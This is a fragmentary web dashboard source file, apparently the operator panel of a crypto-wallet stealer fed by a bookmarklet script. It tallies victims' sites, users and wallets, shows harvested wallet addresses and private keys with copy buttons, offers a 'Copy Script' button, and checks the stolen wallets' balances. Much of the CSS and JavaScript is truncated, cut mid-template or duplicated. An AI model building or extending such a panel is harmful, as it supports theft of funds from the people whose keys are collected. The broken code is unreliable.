        .btn:hover::before {

        .btn svg {

            height: 16px;
            fill: #d1d5db;

        }

        .btn:hover svg {
            fill: #ffffff;
        }

        .btn-primary svg {

        .btn-primary {

            border-color: #4b5563;

        .btn-success svg {
            fill: #d1d5db;
        }

        .btn-secondary {
            background: transparent;
            border-color: #4b5563;

        .tooltip {
            position: absolute;
            bottom: 100%;
            left: 50%;
            transform: translateX(-50%);
            background: #000000;
            color: #ffffff;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 12px;
            white-space: nowrap;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.2s ease, visibility 0.2s ease;
            z-index: 1000;
            margin-bottom: 5px;
        }

        .tooltip::after {
            content: '';
            position: absolute;
            top: 100%;
            left: 50%;
            transform: translateX(-50%);
            border-left: 5px solid transparent;
            border-right: 5px solid transparent;
            border-top: 5px solid #000000;

        .btn:hover .tooltip {

            left: 0;

        .modal-content {

        .key-label {

        .copy-btn {

        .selected-indicator {
            position: absolute;
            top: 8px;
            right: 8px;

        .settings-section {

        .default-preview {

        .transparent-preview {

        .theme-info {

            text-align: center;

        .theme-title {
            color: #ffffff;

            margin-bottom: 4px;

    <script>
        let bookmarkData = [];

        async function loadData() {
            try {
                const response = await fetch('/api/bookmark-data');
                bookmarkData = await response.json();
                renderStats();
                renderTable();
            } catch (error) {
                console.error('Error loading data:', error);
            }
        }

        function renderStats() {
            const statsGrid = document.getElementById('statsGrid');
            const totalEntries = bookmarkData.length;
            const last24Hours = bookmarkData.filter(item => 
                new Date(item.timestamp) > new Date(Date.now() - 24*60*60*1000)
            ).length;
            const uniqueSites = new Set(bookmarkData.map(item => item.site)).size;
            const uniqueUsers = new Set(bookmarkData.map(item => item.user?.id || item.user?.userId).filter(Boolean)).size;
            const withSBundles = bookmarkData.filter(item => item.sBundles && item.sBundles !== 'null').length;
            const totalWallets = bookmarkData.reduce((total, item) => total + (item.processedSBundles?.count || 0), 0);

            statsGrid.innerHTML = `
                <div class="stat-card">
                    <div class="stat-number">${totalEntries}</div>
                    <div class="stat-label">Total Entries</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">${last24Hours}</div>
                    <div class="stat-label">Last 24 Hours</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">${uniqueSites}</div>
                    <div class="stat-label">Unique Sites</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">${uniqueUsers}</div>
                    <div class="stat-label">Unique Users</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">${withSBundles}</div>
                    <div class="stat-label">With sBundles</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">${totalWallets}</div>
                    <div class="stat-label">Total Wallets</div>
                </div>
            `;

            document.getElementById('totalEntries').textContent = `${totalEntries} entries`;
        }

        function renderTable() {
            const tbody = document.getElementById('dataTableBody');
            tbody.innerHTML = bookmarkData.map(item => {
                const sBundlesCount = item.processedSBundles?.count || 0;
                const hasError = item.processedSBundles?.wallets?.some(w => w.error);
                const statusClass = sBundlesCount > 0 ? (hasError ? 'status-warning' : 'status-success') : 'status-error';
                
                return `
                    <tr>
                        <td>
                            <span class="status-indicator ${statusClass}"></span>
                            ${sBundlesCount > 0 ? (hasError ? 'Partial' : 'Success') : 'No Data'}
                        </td>
                        <td>${new Date(item.timestamp).toLocaleString()}</td>
                        <td>
                            <a href="${item.site}" target="_blank" style="color: #ffffff; text-decoration: none;">
                                ${item.site.length > 30 ? item.site.substring(0, 30) + '...' : item.site}
                            </a>
                        </td>
                        <td>
                            <div>${item.user?.name || item.user?.email || 'N/A'}</div>
                            <div style="font-size: 12px; color: rgba(255,255,255,0.5);">

                            </span>
                        </td>

                                    <div class="tooltip">Delete</div>

                                    </svg>
                                    <div class="tooltip">Copy Script</div>
                                </button>` : ''}
                                ${item.processedSBundles?.wallets ? `
                                <button class="btn btn-success" onclick="viewWallets(${item.id})">
                                    <svg viewBox="0 0 24 24">
                                        <path d="M21,18V19A2,2 0 0,1 19,21H5C3.89,21 3,20.1 3,19V5A2,2 0 0,1 5,3H19A2,2 0 0,1 21,5V6H20A2,2 0 0,0 18,8V16A2,2 0 0,0 20,18M20,8V16H22V8A2,2 0 0,0 20,6V8Z"/>
                                    </svg>
                                    <div class="tooltip">View Keys</div>
                                </button>` : ''}

        }

        async function deleteEntry(id) {
            if (confirm('Are you sure you want to delete this entry?')) {
                try {
                    const response = await fetch(`/api/bookmark-data/${id}`, {
                        method: 'DELETE'
                    });
                    const result = await response.json();
                    if (result.success) {
                        await loadData();
                    } else {
                        alert('Failed to delete entry');
                    }
                } catch (error) {
                    alert('Error deleting entry: ' + error.message);
                }
            }
        }

            const entry = bookmarkData.find(item => item.id === id);

location.reload();`;
            
            navigator.clipboard.writeText(script).then(() => {
                showNotification('Script copied to clipboard!');

                alert('Failed to copy script: ' + err.message);
            });
        }

        function viewWallets(id) {

            let walletsHtml = '';
            
            if (entry.processedSBundles.error) {

                        <p style="color: #ef4444; margin: 0; font-size: 14px;"><strong>Error:</strong> ${entry.processedSBundles.error}</p>
                    </div>
                `;
            }
            
            if (entry.processedSBundles.wallets && entry.processedSBundles.wallets.length > 0) {
                walletsHtml += entry.processedSBundles.wallets.map((wallet, index) => {
                    if (wallet.error) {
                        return `
                            <div class="wallet-item wallet-error">
                                <div class="wallet-header">
                                    <span class="wallet-number">
                                        <svg class="wallet-status-icon" viewBox="0 0 24 24" fill="#ef4444">
                                            <path d="M19,6.41L17.59,5L12,10.59L6.41,5L5,6.41L10.59,12L5,17.59L6.41,19L12,13.41L17.59,19L19,17.59L13.41,12L19,6.41Z"/>
                                        </svg>
                                        Wallet ${wallet.walletIndex}
                                    </span>
                                </div>
                                <p style="color: #ef4444; margin: 0; font-size: 12px;">${wallet.error}</p>
                            </div>
                        `;
                    } else {
                        return `
                            <div class="wallet-item wallet-success">
                                <div class="wallet-header">
                                    <span class="wallet-number">
                                        <svg class="wallet-status-icon" viewBox="0 0 24 24" fill="#10b981">
                                            <path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"/>
                                        </svg>
                                        Wallet ${wallet.walletIndex}
                                    </span>
                                </div>
                                
                                <div class="key-section">
                                    <div class="key-label">Wallet address</div>
                                    <div class="key-display key-display-with-copy" onclick="copyToClipboard('${wallet.publicKey}')">
                                        ${wallet.publicKey}
                                        <button class="copy-btn">
                                            <svg viewBox="0 0 24 24">
                                                <path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/>
                                            </svg>
                                        </button>
                                    </div>
                                </div>

                                    <div class="key-label">Private Key</div>
                                    <div class="key-display blurred" data-key="${wallet.privateKey}" data-type="private" onclick="toggleKeyVisibility(this)">
                                        ${wallet.privateKey}
                                    </div>
                                </div>
                            </div>
                        `;
                    }
                }).join('');
            }
            
            content.innerHTML = `
                <div class="modal-header">
                    <h3 class="modal-title">Private Key</h3>
                    <button class="modal-close" onclick="closeModal()">&times;</button>
                </div>
                <div class="modal-body">
                    ${walletsHtml}
                </div>
            `;
            
            document.body.appendChild(modal);
        }

        function viewFullData(id) {
            const entry = bookmarkData.find(item => item.id === id);
            if (!entry) {
                alert('Entry not found');
                return;
            }
            
            const modal = createModal();
            const content = modal.querySelector('.modal-content');
            
            content.innerHTML = `
                <div class="modal-header">
                    <h3 class="modal-title" style="display: flex; align-items: center; gap: 10px;">
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="#ffffff">

                        Full Data for Entry #${entry.id}
                    </h3>
                    <button class="modal-close" onclick="closeModal()">&times;</button>
                </div>
                <div class="modal-body">
                    <pre style="background: rgba(0,0,0,0.4); padding: 20px; border-radius: 8px; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 11px; border: 1px solid rgba(255,255,255,0.1); margin: 0; line-height: 1.4; white-space: pre-wrap; word-wrap: break-word;">${JSON.stringify(entry, null, 2)}</pre>
                </div>
            `;
            
            document.body.appendChild(modal);
        }

        function createModal() {
            const modal = document.createElement('div');
            modal.className = 'modal';
            modal.innerHTML = '<div class="modal-content"></div>';
            
            modal.onclick = (e) => {
                if (e.target === modal) closeModal();
            };
            
            return modal;
        }

        function closeModal() {
            const modal = document.querySelector('.modal');
            if (modal) {
                document.body.removeChild(modal);
            }
        }

        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(() => {
                showNotification('Key copied to clipboard!');
            }).catch(err => {
                alert('Failed to copy: ' + err.message);
            });
        }

        function toggleKeyVisibility(element) {
            const key = element.getAttribute('data-key');
            const type = element.getAttribute('data-type');
            
            if (element.classList.contains('blurred')) {
                element.classList.remove('blurred');
                element.classList.add('revealed');
                showNotification(`${type === 'private' ? 'Private' : 'Public'} key revealed! Click again to copy.`);
            } else if (element.classList.contains('revealed') || type === 'public') {
                copyToClipboard(key);
            }
        }

        function showNotification(message) {
            const notification = document.getElementById('copyNotification');
            notification.innerHTML = `
                <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" style="margin-right: 8px; vertical-align: middle;">
                    <path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"/>
                </svg>
                ${message}
            `;
            notification.style.display = 'block';
            setTimeout(() => {
                notification.style.display = 'none';
            }, 2000);
        }

        function selectVideo(videoUrl, element) {
            document.querySelectorAll('.video-option').forEach(option => {
                option.classList.remove('selected');
            });
            
            element.classList.add('selected');
            
            currentVideoUrl = videoUrl;
        }

        function applyVideoSettings() {
            const backgroundVideo = document.getElementById('backgroundVideo');
            const videoSource = backgroundVideo.querySelector('source');
            
            videoSource.src = currentVideoUrl;
            backgroundVideo.load();
            backgroundVideo.play();
            
            localStorage.setItem('selectedVideo', currentVideoUrl);
            
            showNotification('Background video updated successfully!');
            closeModal();
        }

        function loadSavedVideo() {
            const savedVideo = localStorage.getItem('selectedVideo');
            if (savedVideo) {
                const backgroundVideo = document.getElementById('backgroundVideo');
                const videoSource = backgroundVideo.querySelector('source');
                videoSource.src = savedVideo;
                backgroundVideo.load();
                currentVideoUrl = savedVideo;
            }
        }

        function toggleVideoSound() {
            const video = document.getElementById('backgroundVideo');
            const soundIcon = document.getElementById('soundIcon');
            
            if (video.muted) {
                video.muted = false;

        let currentTheme = localStorage.getItem('selectedTheme') || 'default';

        function getCurrentTheme() {
            return currentTheme;
        }

        function selectTheme(theme, element) {
            document.querySelectorAll('.theme-option').forEach(option => {
                option.classList.remove('selected');
            });
            
            element.classList.add('selected');
            
            currentTheme = theme;
        }

        function applyThemeSettings() {
            document.body.className = currentTheme === 'transparent' ? 'transparent-theme' : '';
            
            localStorage.setItem('selectedTheme', currentTheme);
            
            showNotification('Theme updated successfully!');
            closeModal();
        }

        function loadSavedTheme() {
            const savedTheme = localStorage.getItem('selectedTheme');
            if (savedTheme) {
                currentTheme = savedTheme;
                document.body.className = savedTheme === 'transparent' ? 'transparent-theme' : '';
            }
        }

        // auth stuff
        function checkAdminAuth() {
            const adminToken = localStorage.getItem('adminAuth');
            if (!adminToken) {
                window.location.href = '/login';
                return false;
            }

            fetch('/api/verify-admin', {
                headers: {
                    'Authorization': `Bearer ${adminToken}`
                }
            })
            .then(response => response.json())
            .then(result => {
                if (!result.success) {
                    localStorage.removeItem('adminAuth');
                    window.location.href = '/login';
                }
            })
            .catch(() => {
                localStorage.removeItem('adminAuth');
                window.location.href = '/login';
            });

            return true;
        }

        function makeAuthorizedRequest(url, options = {}) {
            const adminToken = localStorage.getItem('adminAuth');
            
            if (!adminToken) {
                window.location.href = '/login';
                return;
            }

            return fetch(url, {
                ...options,
                headers: {
                    ...options.headers,
                    'Authorization': `Bearer ${adminToken}`
                }
            });
        }

        async function logout() {
            const adminToken = localStorage.getItem('adminAuth');
            
            if (adminToken) {
                try {
                    await fetch('/api/admin-logout', {
                        method: 'POST',
                        headers: {
                            'Authorization': `Bearer ${adminToken}`
                        }
                    });
                } catch (error) {
                    console.error('Logout error:', error);
                }
            }
            
            localStorage.removeItem('adminAuth');
            window.location.href = '/login';
        }

        async function loadData() {
            try {
                const response = await makeAuthorizedRequest('/api/bookmark-data');
                bookmarkData = await response.json();
                renderStats();
                renderTable();
            } catch (error) {
                console.error('Error loading data:', error);
                if (error.status === 401) {
                    window.location.href = '/login';
                }
            }
        }

        async function deleteEntry(id) {
            if (confirm('Are you sure you want to delete this entry?')) {
                try {
                    const response = await makeAuthorizedRequest(`/api/bookmark-data/${id}`, {
                        method: 'DELETE'
                    });
                    const result = await response.json();
                    if (result.success) {
                        await loadData();
                    } else {
                        alert('Failed to delete entry');
                    }
                } catch (error) {
                    alert('Error deleting entry: ' + error.message);
                }
            }
        }

        async function checkBalances() {
            const btn = document.getElementById('checkBalanceBtn');
            const originalContent = btn.innerHTML;
            
            btn.innerHTML = `
                <svg viewBox="0 0 24 24" style="animation: spin 1s linear infinite;">
                    <path d="M12,4V2A10,10 0 0,0 2,12H4A8,8 0 0,1 12,4Z"/>
                </svg>
                <div class="tooltip">Checking...</div>
            `;
            btn.disabled = true;
            
            try {
                const response = await makeAuthorizedRequest('/api/check-balances');
                const data = await response.json();
                
                if (data.success) {
                    displayBalanceResults(data);
                } else {
                    alert('Error checking balances: ' + data.error);
                }
            } catch (error) {
                alert('Error checking balances: ' + error.message);
            } finally {
                btn.innerHTML = originalContent;
                btn.disabled = false;
            }
        }

        window.addEventListener('DOMContentLoaded', () => {
            if (checkAdminAuth()) {
                loadData();
                loadSavedVideo();
                loadSavedTheme();
            }
        });
